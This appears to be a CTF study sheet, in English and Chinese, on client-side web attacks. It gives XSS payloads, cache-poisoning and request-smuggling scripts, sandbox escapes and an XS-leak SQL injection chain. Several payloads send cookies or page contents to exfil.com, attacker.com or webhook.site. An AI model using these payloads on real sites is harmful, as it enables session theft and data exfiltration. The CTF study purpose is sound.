# CTF Web - Client-Side Attacks

## Table of Contents
- [XSS Payloads](#xss-payloads)
  - [Basic](#basic)
  - [Cookie Exfiltration](#cookie-exfiltration)
  - [Filter Bypass](#filter-bypass)
  - [Hex/Unicode Bypass](#hexunicode-bypass)
- [DOMPurify Bypass via Trusted Backend Routes](#dompurify-bypass-via-trusted-backend-routes)
- [JavaScript String Replace Exploitation](#javascript-string-replace-exploitation)
- [Client-Side Path Traversal (CSPT)](#client-side-path-traversal-cspt)
- [Cache Poisoning](#cache-poisoning)
  - [X-Forwarded-Host CDN Template Fetch Poisoning (CSAW 2018)](#x-forwarded-host-cdn-template-fetch-poisoning-csaw-2018)
- [Hidden DOM Elements](#hidden-dom-elements)
- [React-Controlled Input Programmatic Filling](#react-controlled-input-programmatic-filling)
- [Magic Link + Redirect Chain XSS](#magic-link--redirect-chain-xss)
- [Content-Type via File Extension](#content-type-via-file-extension)
- [DOM XSS via jQuery Hashchange (Crypto-Cat)](#dom-xss-via-jquery-hashchange-crypto-cat)
- [Shadow DOM XSS](#shadow-dom-xss)
- [DOM Clobbering + MIME Mismatch](#dom-clobbering--mime-mismatch)
- [HTTP Request Smuggling via Cache Proxy](#http-request-smuggling-via-cache-proxy)
- [CSS/JS Paywall Bypass](#cssjs-paywall-bypass)
- [JPEG+HTML Polyglot XSS (EHAX 2026)](#jpeghtml-polyglot-xss-ehax-2026)
- [JSFuck Decoding](#jsfuck-decoding)
- [AngularJS 1.x Sandbox Escape via charAt/trim Override (Google CTF 2017)](#angularjs-1x-sandbox-escape-via-charattrim-override-google-ctf-2017)
- [Admin Bot javascript: URL Scheme Bypass (DiceCTF 2026)](#admin-bot-javascript-url-scheme-bypass-dicectf-2026)
- [XS-Leak via Image Load Timing + GraphQL CSRF (HTB GrandMonty)](#xs-leak-via-image-load-timing--graphql-csrf-htb-grandmonty)
  - [Why it works](#why-it-works)
  - [Step 1 — Redirect bot via meta refresh (CSP bypass)](#step-1--redirect-bot-via-meta-refresh-csp-bypass)
  - [Step 2 — Timing oracle via image loads](#step-2--timing-oracle-via-image-loads)
  - [Step 3 — Character-by-character extraction](#step-3--character-by-character-extraction)
  - [Step 4 — Host exploit and tunnel](#step-4--host-exploit-and-tunnel)
- [jQuery `$(location.hash)` CSS Selector Timing Leak (hxp 2018)](#jquery-locationhash-css-selector-timing-leak-hxp-2018)

---

## XSS Payloads

### Basic
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
```

### Cookie Exfiltration
```html
<script>fetch('https://exfil.com/?c='+document.cookie)</script>
<img src=x onerror="fetch('https://exfil.com/?c='+document.cookie)">
```

### Filter Bypass
```html
<ScRiPt>alert(1)</ScRiPt>           <!-- Case mixing -->
<script>alert`1`</script>           <!-- Template literal -->
<img src=x onerror=alert&#40;1&#41;>  <!-- HTML entities -->
<svg/onload=alert(1)>               <!-- No space -->
```

### Hex/Unicode Bypass
- 十六进制编码：`\x3cscript\x3e`
- HTML 实体：`&#60;script&#62;`

---

## DOMPurify Bypass via Trusted Backend Routes

前端在自动保存前做了清洗，但后端默认信任自动保存接口，不再做清洗。  
利用方式：直接向 `/api/autosave` 发送带 XSS 载荷的 POST 请求。

---

## JavaScript String Replace Exploitation

`.replace()` 的特殊替换模式：`$\`` 表示匹配前内容，`$'` 表示匹配后内容。  
载荷：`<img src="abc$\`<img src=x onerror=alert(1)>">`

---

## Client-Side Path Traversal (CSPT)

前端 JS 在 `fetch` 中直接使用 URL 参数且未校验：
```javascript
const profileId = urlParams.get("id");
fetch("/log/" + profileId, { method: "POST", body: JSON.stringify({...}) });
```
利用：`/user/profile?id=../admin/addAdmin`，会带着原本的 CSRF 请求体去请求 `/admin/addAdmin`。

参数污染：`/user/profile?id=1&id=../admin/addAdmin`  
后端取第一个参数，前端取最后一个参数。

---

## Cache Poisoning

CDN 或缓存仅按 URL 建键：
```python
requests.get(f"{TARGET}/search?query=harmless", data=f"query=<script>evil()</script>")
# All visitors to /search?query=harmless get XSS
```

### X-Forwarded-Host CDN Template Fetch Poisoning (CSAW 2018)

**模式：** 应用前面挂着 CDN，缓存键只包含 path + query。后端 Mustache 模板会渲染 `<script src="https://{{host}}/cdn/app.js">`，其中 `{{host}}` 来自 `X-Forwarded-Host` 头。攻击者发一次 `X-Forwarded-Host: attacker.tld`，Varnish 将响应缓存 120 秒，随后访问者都会从攻击者域名加载 JavaScript。

```http
GET /cdn/app.js HTTP/1.1
Host: target.tld
X-Forwarded-Host: attacker.tld
```

```python
import requests, time
# Poison the cache
requests.get("https://target.tld/cdn/app.js",
             headers={"X-Forwarded-Host": "attacker.tld"})
# Within the 120s TTL any visitor pulls https://attacker.tld/cdn/app.js
```

**关键点：** 缓存键通常不包含请求头，即使这些请求头会进入响应体。任何会被后端反射到 HTML 中的头（`Host`、`X-Forwarded-Host`、`X-Original-URL`、`X-Rewrite-URL`、`Forwarded`），一旦响应被缓存，就可能成为 Web Cache Poisoning 向量。修复方法是在边缘层剥离这些头，或显式加上 `Vary: X-Forwarded-Host`。攻击者常用 Burp Param Miner 的 `unkeyed header discovery` 去找这类点。

**参考：** CSAW CTF Qualification Round 2018 — Hacker Movie Club, writeup 11277

---

## Hidden DOM Elements

证明信息或 flag 可能藏在 `display: none`、`visibility: hidden`、`opacity: 0` 或移出屏幕的元素里：
```javascript
document.querySelectorAll('[style*="display: none"], [hidden]')
  .forEach(el => console.log(el.id, el.textContent));

// Find all hidden content
document.querySelectorAll('*').forEach(el => {
  const s = getComputedStyle(el);
  if (s.display === 'none' || s.visibility === 'hidden' || s.opacity === '0')
    if (el.textContent.trim()) console.log(el.tagName, el.id, el.textContent.trim());
});
```

---

## React-Controlled Input Programmatic Filling

React 会忽略直接赋值 `.value`。需要调用原生 setter 再补发事件：
```javascript
const input = document.querySelector('input[placeholder="SDG{...}"]');
const nativeSetter = Object.getOwnPropertyDescriptor(
  window.HTMLInputElement.prototype, 'value'
).set;
nativeSetter.call(input, 'desired_value');
input.dispatchEvent(new Event('input', { bubbles: true }));
input.dispatchEvent(new Event('change', { bubbles: true }));
```

对 React、Vue、Angular 都有效。做 DevTools 自动填表时很常用。

---

## Magic Link + Redirect Chain XSS
```javascript
// /magic/:token?redirect=/edit/<xss_post_id>
// Sets auth cookies, then redirects to attacker-controlled XSS page
```

---

## Content-Type via File Extension
```javascript
// @fastify/static determines Content-Type from extension
noteId = '<img src=x onerror="alert(1)">.html'
// Response: Content-Type: text/html → XSS
```

---

## DOM XSS via jQuery Hashchange (Crypto-Cat)

**模式：** jQuery 的 `$()` 选择器 sink，配合 `location.hash` source 和 `hashchange` 事件处理器。现代 jQuery 已阻止直接 `$(location.hash)` 的 HTML 注入，但可以借助 iframe 触发 `hashchange` 来绕过。

**脆弱模式：**
```javascript
$(window).on('hashchange', function() {
    var element = $(location.hash);
    element[0].scrollIntoView();
});
```

**通过 iframe 利用：** 把目标放进 iframe，初次加载后用 `onload` 改写 hash，无需用户交互：
```html
<iframe src="https://vulnerable.com/#"
  onload="this.src+='<img src=x onerror=print()>'">
</iframe>
```

**关键点：** iframe 的 `onload` 会在初次加载后触发，随后修改 `this.src` 会让目标页触发 `hashchange`。hash 内容 `<img src=x onerror=print()>` 进入 jQuery 的 `$()` 后会被当成 HTML 解析，从而创建带 XSS 载荷的 DOM 元素。

**识别方式：** 搜索 `$(location.hash)`、`$(window.location.hash)`，以及任何把 URL fragment 中的用户输入传给 jQuery 选择器的位置。

---

## Shadow DOM XSS

**Closed Shadow DOM 数据窃取（Pragyan 2026）：** 用 Proxy 包裹 `attachShadow`，拿到 shadow root 引用：
```javascript
var _r, _o = Element.prototype.attachShadow;
Element.prototype.attachShadow = new Proxy(_o, {
  apply: (t, a, b) => { _r = Reflect.apply(t, a, b); return _r; }
});
// After target script creates shadow DOM, _r contains the root
```

**间接 eval 作用域逃逸：** `(0,eval)('code')` 可以跳出 `with(document)` 的作用域限制。

**通过 avatar URL 夹带载荷：** 在固定前缀后拼接完整 JS，再用 `avatar.slice(N)` 取出执行：
```html
<svg/onload=(0,eval)('eval(avatar.slice(24))')>
```

**`</script>` 注入（Shadow Fight 2）：** 关键词过滤常常漏掉 HTML 结构标签。`</script>` 可先闭合现有脚本上下文，再用 `<script src=//evil>` 加载外部脚本，外部脚本再从 `document.scripts[].textContent` 中读取 flag。

---

## DOM Clobbering + MIME Mismatch

**MIME 类型混淆（Pragyan 2026）：** CDN 或服务器检查 `.jpeg`，却没检查 `.jpg`，导致 `.jpg` 以 `text/html` 返回，JPEG polyglot 中的 HTML 会按页面执行。

**基于表单的 DOM clobbering：**
```html
<form id="config"><input name="canAdminVerify" value="1"></form>
<!-- Makes window.config.canAdminVerify truthy, bypassing JS checks -->
```

---

## HTTP Request Smuggling via Cache Proxy

**缓存代理反序列化失步（Pragyan 2026）：** 某些缓存型 TCP 代理在直接返回缓存响应时不会消费请求体，残留字节会被当作下一条请求解析。

**窃取 Cookie 的模式：**
1. 先制造一个会被缓存的资源，比如博客文章。
2. 发送一个指向该缓存 URL 的请求，并在后面拼接不完整的 POST，请求体声明较大的 `Content-Length`，但只发送一部分。
3. 缓存代理命中缓存后直接返回响应，不消费后续 POST 请求体。
4. 管理员机器的下一次请求字节会补齐这个 POST 请求体，并被存到服务器上。
5. 读取该存储内容，从中提取管理员 Cookie。

```python
inner_req = (
    f"POST /create HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    f"Cookie: session={user_session}\r\n"
    f"Content-Length: 256\r\n"  # Large, but only partial body sent
    f"\r\n"
    f"content=LEAK_"  # Victim's request completes this
)
outer_req = (
    f"GET /cached-page HTTP/1.1\r\n"
    f"Content-Length: {len(inner_req)}\r\n"
    f"\r\n"
).encode() + inner_req
```

---

## CSS/JS Paywall Bypass

**模式（Great Paywall, MetaCTF 2026）：** 文章正文完整存在于 HTML 中，但被一个 CSS/JS 覆盖层挡住，例如 `position: fixed; z-index: 99999; backdrop-filter: blur(...)` 加一个 “Subscribe” 按钮。

**快速解法：** 直接 `curl` 页面。没有 CSS/JS 渲染时，原始 HTML 里通常就有完整文章和 flag。

```bash
curl -s https://target/article | grep -i "flag\|CTF{"
```

**其他做法：**
- 浏览器里直接看页面源码（Ctrl+U）
- DevTools 删除覆盖层元素
- 在浏览器设置里禁用 JavaScript
- 控制台执行 `document.querySelector('#paywall-overlay').remove()`
- 冒充 Googlebot：`curl -H "User-Agent: Googlebot" https://target/article`

**关键点：** 很多 paywall 本质只是前端 DOM 覆盖层，内容始终已经在 HTML 里。题目提示里如果出现 “paywalls are just DOM” 这类话，通常就是在暗示这一点。复杂操作之前先试 `curl` 或 view-source。

**识别方式：** 在页面源码里找带 `position: fixed`、高 `z-index`、`backdrop-filter: blur()` 的 `<div>`，这通常就是覆盖式 paywall。

---

## JPEG+HTML Polyglot XSS (EHAX 2026)

**模式（Metadata Meyham）：** 文件上传只校验 JPEG，且上传后的文件以宽松 MIME 类型返回；管理员 bot 会访问被举报文件。

**攻击方式：** 构造 JPEG+HTML polyglot，前面是合法 JPEG 头，后面拼接 HTML/JS 载荷：
```python
from PIL import Image
import io

# Create minimal valid JPEG
img = Image.new('RGB', (1,1), color='red')
buf = io.BytesIO()
img.save(buf, 'JPEG', quality=1)
jpeg_data = buf.getvalue()

# HTML payload appended after JPEG data
html_payload = '''<!DOCTYPE html>
<html><body><script>
(async function(){
  // Fetch admin page content
  var r = await fetch("/admin");
  var t = await r.text();
  // Exfiltrate via self-upload (stays on same origin)
  var j = new Uint8Array([255,216,255,224,0,16,74,70,73,70,0,1,1,0,0,1,0,1,0,0,255,217]);
  var b = new Blob([j], {type:'image/jpeg'});
  var f = new FormData();
  f.append('file', b, 'FLAG_' + btoa(t).substring(0,100) + '.jpg');
  await fetch('/upload', {method:'POST', body:f});
  // Also try external webhook
  new Image().src = "https://webhook.site/YOUR_ID?d=" + encodeURIComponent(t.substring(0,500));
})();
</script></body></html>'''

polyglot = jpeg_data + b'\n' + html_payload.encode()
# Upload as .html with image/jpeg content type
```

**PoW 绕过：** 许多 CTF 的举报接口要求 SHA-256 proof-of-work：
```python
import hashlib
nonce = 0
while True:
    h = hashlib.sha256((challenge + str(nonce)).encode()).hexdigest()
    if h.startswith('0' * difficulty):
        break
    nonce += 1
```

**数据外带方式（按可靠性排序）：**
1. **自上传：** 访问 `/admin`，把结果塞进文件名上传，再去 `/files` 里查看新文件名。
2. **Webhook：** `fetch('https://webhook.site/ID?flag='+data)`，但可能被 CSP 挡住。
3. **DNS 外带：** `new Image().src = 'http://'+btoa(flag)+'.attacker.com'`，通常比普通出站请求更容易绕过 CSP。

**关键点：** JPEG 对尾随数据很宽容。只要 MIME 允许，浏览器会在响应中的任意位置解析 HTML。于是同一个文件既是合法 JPEG，也是合法 HTML。

---

## JSFuck Decoding

**模式（JShit, PascalCTF 2026）：** 页面源码只包含 JSFuck（仅由 `[]()!+` 组成）。处理方法是在 Node.js 中去掉结尾 `()()`，再对结果调用 `.toString()`：
```javascript
const code = fs.readFileSync('jsfuck.js', 'utf8');
// Remove last () to get function object instead of executing
const func = eval(code.slice(0, -2));
console.log(func.toString());  // Reveals original code with hardcoded flag
```

---

## AngularJS 1.x Sandbox Escape via charAt/trim Override (Google CTF 2017)

**模式：** AngularJS 1.6 之前会在 `{{ }}` 表达式里启用 sandbox，试图阻止任意 JavaScript 执行。该 sandbox 依赖 `charAt` 逐字符校验标识符。把 `String.prototype.charAt` 覆盖为 `trim` 后，可绕过校验，再用 `$eval` 执行任意 JS。

**载荷：**
```javascript
{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,window.location="http://attacker.com/"+document.cookie,a')}}
```

**原理：**
1. `toString().constructor.prototype` 取到 `String.prototype`。
2. `a.charAt=a.trim` 把所有字符串的 `charAt` 替换成 `trim`。
3. sandbox 会对标识符调用 `charAt(0)` 做校验，但 `trim` 返回的是整个字符串，不是单个字符。
4. 这样就破坏了逐字符校验逻辑，可放行任意表达式。
5. `$eval('expression')` 最终在 Angular 作用域内执行任意 JavaScript。

**不同 AngularJS 版本的更短变体：**
```javascript
<!-- AngularJS 1.5.x -->
{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)')}}

<!-- AngularJS 1.4.x -->
{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//')}}

<!-- AngularJS 1.3.x -->
{{constructor.constructor('return window.location="http://attacker.com/"+document.cookie')()}}
```

**识别方式：** HTML 中存在 `ng-app`、`ng-controller`，或引入了 `angular.js` / `angular.min.js`，并且有会反射用户输入的 `{{ }}` 表达式绑定。

**关键点：** sandbox 用 `charAt` 校验标识符，换成 `trim` 后就能绕过逐字符检查，从而执行任意表达式。AngularJS 1.6+ 已完全移除这个 sandbox，因为官方承认它从来不是安全边界；但很多 CTF 和旧应用仍在用旧版。

---

## Admin Bot javascript: URL Scheme Bypass (DiceCTF 2026)

**模式（Mirror Temple）：** 管理员 bot 会跳转到用户提供的 URL，并用 `new URL()` 校验。这个校验只检查语法，不检查协议。`javascript:` URL 会通过校验，并在 bot 已登录上下文中执行任意 JS。

**脆弱校验：**
```javascript
try {
  new URL(targetUrl)   // Accepts javascript:, data:, file:, etc.
} catch {
  process.exit(1)
}
await page.goto(targetUrl, { waitUntil: "domcontentloaded" })
```

**利用：**
```bash
# 1. Create authenticated session (bot requires valid cookie)
curl -i -X POST 'https://target/postcard-from-nyc' \
  --data-urlencode 'name=test' \
  --data-urlencode 'flag=dice{test}' \
  --data-urlencode 'portrait='
# Extract save=... cookie from Set-Cookie header

# 2. Submit javascript: URL to report endpoint
curl -X POST 'https://target/report' \
  -H 'Cookie: save=YOUR_COOKIE' \
  --data-urlencode "url=javascript:fetch('/flag').then(r=>r.text()).then(f=>location='https://webhook.site/ID/?flag='+encodeURIComponent(f))"
```

**为什么 CSP/SRI 无效（B-Side 变体）：** B-Side 版本加入了内联 CSS、脚本 SRI 和严格 CSP，但都无关，因为 `javascript:` URL 在**导航上下文**中执行。bot 是直接导航到 JS URL，而不是注入进已有页面；目标页自己的 CSP 还没机会生效。

**修复：**
```javascript
const u = new URL(targetUrl)
if (!['http:', 'https:'].includes(u.protocol)) {
  process.exit(1)
}
```

**关键点：** `new URL()` 是**语法校验器**，不是**安全校验器**。它会接受 `javascript:`、`data:`、`file:`、`blob:` 等危险 scheme。任何只靠 `new URL()` 校验的 admin bot 或 SSRF 处理器都存在风险，必须显式做协议 allowlist。

---

## XS-Leak via Image Load Timing + GraphQL CSRF (HTB GrandMonty)

**模式：** 管理员 bot 访问攻击者页面后，页面里的 JavaScript 通过跨域请求打到 `localhost` 的 GraphQL 接口，再用图片加载时序测量基于时间的 SQL 注入，最后逐字符外带数据。

### Why it works

1. **GraphQL GET CSRF：** 很多 GraphQL 实现不仅接受 POST+JSON，也接受 GET。图片发起 GET 请求不会触发 CORS 预检，不需要 `OPTIONS`。
2. **Bot 运行在 localhost 环境：** 管理员 bot 的浏览器能访问 `localhost:1337/graphql`，而外部用户无法直接连到这个端口。
3. **图片报错计时：** `new Image().src = url` 会在服务器响应后触发 `onerror`。若 SQL 里执行了 `SLEEP(1)`，响应就会明显变慢，于是可用时序差异判断字符是否匹配。

### Step 1 — Redirect bot via meta refresh (CSP bypass)

若 CSP 禁止内联脚本，可以先用 HTML 注入和 `<meta>` 跳转把 bot 导到攻击者页面：
```bash
curl -b cookies.txt "http://TARGET/api/chat/send" \
  -X POST -H "Content-Type: application/json" \
  -d '{"message": "<meta http-equiv=\"refresh\" content=\"0;url=https://ATTACKER/exploit.html\" />"}'
```

bot 跳到攻击者页面后，JavaScript 就在新的源下自由执行，不再受目标页面 CSP 约束。

### Step 2 — Timing oracle via image loads

```javascript
const imageLoadTime = (src) => {
    return new Promise((resolve) => {
        let start = performance.now();
        const img = new Image();
        img.onload = () => resolve(0);
        img.onerror = () => resolve(performance.now() - start);
        img.src = src;
    });
};

const xsLeaks = async (query) => {
    let imgURL = 'http://127.0.0.1:1337/graphql?query=' +
        encodeURIComponent(query);
    let delay = await imageLoadTime(imgURL);
    return delay >= 1000;  // SLEEP(1) threshold
};
```

### Step 3 — Character-by-character extraction

```javascript
let sqlTemp = `query {
    RansomChat(enc_id: "123' and __LEFT__ = __RIGHT__)-- -")
    {id, enc_id, message, created_at} }`;

let readQueryTemp = `(select sleep(1) from dual where
    BINARY(SUBSTRING((select password from db.users
    where username = 'target'),__POS__,1))`;

let flag = '';
for (let pos = 1; ; pos++) {
    for (let c of charset) {
        let readQuery = readQueryTemp.replace('__POS__', pos);
        let sql = sqlTemp.replace('__LEFT__', readQuery)
                         .replace('__RIGHT__', `'${c}'`);
        if (await xsLeaks(sql)) {
            flag += c;
            new Image().src = exfilURL + '?d=' + encodeURIComponent(flag);
            break;
        }
    }
}
```

### Step 4 — Host exploit and tunnel

```bash
# Cloudflare Tunnel (recommended — no interstitial pages unlike ngrok)
cloudflared tunnel --url http://localhost:8888
python3 -m http.server 8888
```

**关键点：** GraphQL 的 GET 请求可以完全绕过 CORS 预检，`new Image().src` 发起的是简单 GET，不需要 `OPTIONS`。再结合基于 `SLEEP()` 的时序型 SQLi，图片 `onerror` 的耗时就成了布尔 oracle。bot 对 localhost 的访问能力，则把原本只能本地利用的 SQLi 变成可远程利用。

**识别方式：** 带 HTML 注入的聊天/留言功能、管理员 bot、存在 SQL 注入的 GraphQL 接口，以及仅允许 localhost 访问的后台服务，这几项一起出现时要优先考虑这条链。

---

## jQuery `$(location.hash)` CSS Selector Timing Leak (hxp 2018)

**模式：** 目标页面执行 `$(location.hash).addClass(...)`。如果传入的 URL fragment 会被解析为 CSS 选择器，jQuery 就会调用 Sizzle 在 DOM 上做匹配。把 `:has()` 伪类层层嵌套后，只有在选择器**真的匹配**时，求值时间才会稳定膨胀到约 2 秒，于是可对 bot DOM 中任意属性做布尔时序探测，例如 `body[data-user-id^='1']`。

```text
http://127.0.0.1/?id=...#*:has(*:has(*:has(*:has(*:has(body[data-user-id^='1'])))))
```

做外带时，可在 `addClass` 调用前后各发一次 `new Image().src` 到攻击者控制的 `/firstping`、`/secondping`，再测两次请求间隔。约 20 ms 表示不匹配，约 2 s 表示匹配。

**关键点：** jQuery 在 `$` 里接收字符串参数时，若字符串以 `<` 开头会当作 HTML，否则会当作选择器。任何允许攻击者把任意文本传进 `$()` 的 sink，既可能是 XSS，也可能成为选择器时序 oracle。

**参考：** hxp CTF 2018 — µblog, writeup 12554
